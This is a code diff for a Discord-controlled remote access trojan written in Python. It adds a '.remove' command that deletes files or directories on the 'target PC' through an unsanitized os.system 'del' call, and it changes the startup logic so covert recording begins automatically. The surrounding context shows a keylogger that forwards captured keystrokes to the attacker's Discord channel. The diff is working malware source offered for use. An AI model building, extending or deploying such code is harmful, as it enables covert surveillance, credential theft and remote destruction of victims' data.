@@ -91,9 +91,9 @@ async def on_ready():
 
     recording_channel_last_message = await discord.utils.get(client.get_channel(channel_ids['recordings']).history())
 
-    if recording_channel_last_message.content != 'disable':
+    if recording_channel_last_message == None or recording_channel_last_message.content != 'disable':
         Thread(target=start_recording).start()
-        await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Starting recording...`')
+        await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Started recording...`')
     else:
         await client.get_channel(channel_ids['main']).send('`[' + current_time() + '] Recording disabled. If you want to enable it, just delete last message on` <#' + str(channel_ids['recordings']) + '>')
     
@@ -409,6 +409,26 @@ async def on_message(message):
             else:
                 reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
 
+        elif message.content[:7] == '.remove':
+            await message.delete()
+            if message.channel.id == channel_ids['file']:
+                if message.content.strip() == '.remove':
+                    reaction_msg = await message.channel.send('```Syntax: .remove <file-or-directory>```'); await reaction_msg.add_reaction('🔴')
+                else:
+                    if os.path.exists('/'.join(working_directory) + '/' + message.content[8:]):
+                        try:
+                            if os.path.isfile('/'.join(working_directory) + '/' + message.content[8:]):
+                                os.system('del "' + '\\'.join(working_directory) + '\\' + message.content[8:] + '"')
+                            else:
+                                rmtree('/'.join(working_directory) + '/' + message.content[8:])
+                            reaction_msg = await message.channel.send('```Successfully removed  ' + '/'.join(working_directory) + '/' + message.content[8:] + '  from target PC```'); await reaction_msg.add_reaction('🔴')
+                        except Exception as error:
+                            reaction_msg = await message.channel.send('`' + str(error) + '`'); await reaction_msg.add_reaction('🔴')
+                    else:
+                        reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
+            else:
+                reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
+
         elif message.content == '.done':
             await message.delete()
             if message.channel.id == channel_ids['file']:
@@ -620,7 +640,7 @@ def on_press(key):
                 messages_to_send.append([channel_ids['main'], text_buffor])
             text_buffor = ''
 
-
+ 
 with Listener(on_press=on_press) as listener:
     client.run(bot_token)
     listener.join()
